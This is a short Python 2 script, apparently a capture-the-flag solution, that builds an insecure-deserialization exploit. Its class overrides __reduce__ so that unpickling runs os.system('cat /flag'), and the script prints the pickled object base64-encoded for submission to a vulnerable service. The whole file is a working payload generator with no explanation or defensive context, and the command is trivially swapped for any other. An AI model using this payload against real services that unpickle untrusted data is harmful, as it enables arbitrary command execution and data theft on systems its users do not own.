import os
import cPickle
import sys
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /flag',))

shellcode = cPickle.dumps(Exploit())
print base64.b64encode(shellcode)
